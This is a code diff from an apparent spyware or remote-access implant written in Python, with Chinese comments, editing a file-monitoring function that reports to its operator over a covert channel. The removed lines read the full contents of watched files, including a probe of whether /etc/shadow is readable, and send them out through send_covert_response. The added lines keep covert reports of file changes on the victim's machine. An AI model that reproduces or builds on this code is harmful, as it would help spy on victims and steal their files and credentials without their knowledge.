@@ -147,68 +147,37 @@ def get_keylog():
 
 
 def monitor_file(path):
-    """Monitor a single file for changes using polling or inotify."""
-    # 尝试第一次 stat，如果失败就立刻发错误并退出
-    print(f"[DEBUG] access /etc/shadow readable? {os.access(path, os.R_OK)}")
     try:
         last_mtime = os.path.getmtime(path)
     except Exception as e:
-        msg = {
+        send_covert_response(json.dumps({
             "type": "MON_FILE_ERROR",
             "path": path,
-            "timestamp": time.strftime("%Y-%m-%d %H:%M:%S", time.localtime()),
-            "content": f"File not accessible: {e}"
-        }
-        print(f"[DEBUG][Victim] Sending MON_FILE_STARTED")
-        send_covert_response((json.dumps(msg) + "\n").encode())
+            "timestamp": time.strftime("%Y-%m-%d %H:%M:%S"),
+            "error": str(e)
+        }).encode() + b"\n")
         return
-    # 成功后，先发一条“监控已启动”消息
-    msg_start = {
+
+    # 通知监控已启动
+    send_covert_response(json.dumps({
         "type": "MON_FILE_STARTED",
         "path": path,
-        "timestamp": time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
-    }
-    send_covert_response((json.dumps(msg_start) + "\n").encode())
+        "timestamp": time.strftime("%Y-%m-%d %H:%M:%S")
+    }).encode() + b"\n")
 
-    # Simple polling loop
     while mon_file_path == path:
-        print(f"[DEBUG][Victim] polling {path}")
         try:
             mtime = os.path.getmtime(path)
-        except Exception as e:
-            mon_file_events.append(f"File {path} inaccessible: {e}")
-            print(f"[DEBUG][Victim] Exception during stat: {e}")
-            msg = {
-                "type": "MON_FILE_ERROR",
-                "path": path,
-                "timestamp": time.strftime("%Y-%m-%d %H:%M:%S", time.localtime()),
-                "content": f"File inaccessible during monitoring: {e}"
-            }
-            send_covert_response((json.dumps(msg) + "\n").encode())
+        except Exception:
             break
         if mtime != last_mtime:
             last_mtime = mtime
-            print(f"[DEBUG][Victim] Detected change in {path}, reading file")
-            # 1. 读取最新的完整二进制内容
-            try:
-                with open(path, 'rb') as f:
-                    file_bytes = f.read()
-            except Exception as e:
-                print(f"[DEBUG][Victim] Error reading file: {e}")
-                err = f"ERROR reading file: {e}".encode()
-                send_covert_response(b"FILE_TRANSFER_ERROR:" + os.path.basename(path).encode() + b":" + err)
-                continue
-
-            # 2. 构造 header：FILE_TRANSFER:<basename>:
-            basename = os.path.basename(path)
-            header = f"FILE_TRANSFER:{basename}:".encode()
-            print(f"[DEBUG][Victim] Sending FILE_TRANSFER header `{header}` and {len(file_bytes)} bytes")
-
-            # 3. 通过隐蔽通道一次性发出 header + 二进制文件
-            send_covert_response(header + file_bytes)
-
+            send_covert_response(json.dumps({
+                "type": "MON_FILE_MODIFIED",
+                "path": path,
+                "timestamp": time.strftime("%Y-%m-%d %H:%M:%S")
+            }).encode() + b"\n")
         time.sleep(1)
-    print(f"[DEBUG][Victim] monitor_file thread exiting for {path}")
 
 
 def monitor_directory(path):
